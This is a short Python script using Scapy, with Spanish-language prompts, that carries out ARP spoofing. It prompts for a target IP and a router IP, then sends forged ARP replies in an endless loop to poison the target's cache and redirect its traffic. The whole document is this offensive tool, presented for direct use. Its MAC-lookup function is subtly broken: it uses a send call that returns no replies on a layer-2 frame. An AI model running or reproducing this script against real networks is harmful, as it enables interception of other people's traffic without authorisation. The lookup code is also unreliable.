from scapy.sendrecv import send
from scapy.layers.l2 import ARP, Ether
import time

def obtener_mac(ip):
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    paquete = ether/arp
    try:
        resp = send(paquete, verbose=False, timeout=1)
        if resp:
            return resp[0][ARP].hwsrc
        else:
            print(f"No se recibió respuesta para la solicitud ARP a {ip}")
            return None
    except Exception as e:
        print(f"Error al enviar solicitud ARP a {ip}: {e}")
        return None

def arp_spoof(ip_objetivo, ip_router):
    mac_objetivo = obtener_mac(ip_objetivo)
    if not mac_objetivo:
        print(f"No se pudo obtener la dirección MAC de {ip_objetivo}.")
        return
    
    paquete = ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo, psrc=ip_router)
    try:
        while True:
            send(paquete, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Deteniendo ARP spoofing")

if __name__ == "__main__":
    ip_objetivo = input("Introduce la dirección IP de la máquina objetivo: ")
    ip_router = input("Introduce la dirección IP del router: ")

    arp_spoof(ip_objetivo, ip_router)
